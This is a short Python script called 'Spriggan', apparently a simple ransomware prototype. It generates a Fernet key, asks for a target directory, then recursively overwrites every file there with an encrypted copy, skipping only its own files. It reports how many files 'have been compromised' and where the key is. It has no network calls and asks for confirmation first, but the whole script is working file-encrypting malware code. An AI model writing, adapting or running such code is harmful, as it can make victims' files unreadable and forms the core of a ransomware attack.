import pyfiglet
import termcolor
from cryptography.fernet import Fernet
import os
from os.path import isfile
from os import listdir
import time

def generateKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def readKey():
    return open("key.key", "rb").read()

fileCount = 0

text = pyfiglet.figlet_format("Spriggan")

# Aplica colores
colored_text = termcolor.colored(text, color="magenta", attrs=["bold"])

# Muestra el texto
print(colored_text)

print(termcolor.colored("Welcome to Spriggan setup!", color="magenta"))
input(termcolor.colored("\nPress any key to continue ", color="magenta"))

directory = input(termcolor.colored("\nEnter the main directory to be encrypted (leave blank to use the current one): ", color="yellow"))


if len(directory) > 1:
    directory = directory
else:
    directory = os.getcwd()


choice = input(termcolor.colored("\nAre you sure you want to continue? y/n ", color="magenta", attrs=["bold"]))

if "y" in choice:
    print(termcolor.colored("\nStarting encryption process \n", color="red", attrs=["bold"]))
    generateKey()
    key = readKey()

    for root, dirs, files in os.walk(directory):
        for file in files:
            # Omite "setup.py" y "key.key"
            if file not in ["spriggan.py", "key.key", "decrypt.py"]:

                filePath = os.path.join(root, file)

                contents = open(filePath, "rb").read()
                f = Fernet(key)

                contents = f.encrypt(contents)

                with open(filePath, "wb") as targetFile:
                    targetFile.write(contents)
            
                print(termcolor.colored("Encrypting " + str(file), color="yellow"))

                fileCount = fileCount + 1


    print(termcolor.colored("\nEncryption successful, " + str(fileCount) + " files have been compromised", color="green", attrs=["bold"]))
    print(termcolor.colored("\nThe key is located at " + os.path.join(os.getcwd(), "key.key"), color="magenta", attrs=["bold"]))

else:
    print(termcolor.colored("\nQUITTING! \n", color="red", attrs=["bold"]))


